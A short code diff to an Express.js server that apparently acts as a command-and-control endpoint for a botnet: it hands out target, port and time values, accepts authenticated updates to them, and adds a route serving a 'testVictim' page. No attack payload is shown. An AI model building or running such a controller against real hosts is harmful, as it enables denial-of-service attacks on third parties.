@@ -18,9 +18,9 @@ var time = "5";
 app.get('/api', function (req, res) {
 	//res.append('Access-Control-Allow-Origin','http://127.0.0.1:3000/');
 	res.send({'status': status,
-			  'target': target,
-			  'port': port,
-			  'time': time});
+	'target': target,
+	'port': port,
+	'time': time});
 });
 
 app.get('/ui', function (req, res) {
@@ -30,6 +30,11 @@ app.get('/ui', function (req, res) {
 
 app.get('/', function (req, res) {
 	res.send('Welcome! This is not a botnet API!');
+});
+
+app.get('/test', function (req, res) {
+	//res.append('Access-Control-Allow-Origin','http://127.0.0.1:3000/');
+	res.sendFile(__dirname + "/static/testVictim.html");
 });
 
 app.post('/api/post', function (req, res) {
@@ -50,12 +55,12 @@ app.post('/api/post', function (req, res) {
 		'\n     Port: ' + port +
 		'\n     Time: ' + time
 		);
-		res.send('recieved');
+	res.send('recieved');
 	} else{
-		console.log('Post recieved with bad auth:\n     '
-			+ req.body.auth +
-			-'\n     From: ' + req.ip);
-		res.send('bad auth');
+	console.log('Post recieved with bad auth:\n     '
+	+ req.body.auth +
+	-'\n     From: ' + req.ip);
+	res.send('bad auth');
 	}
 
 });
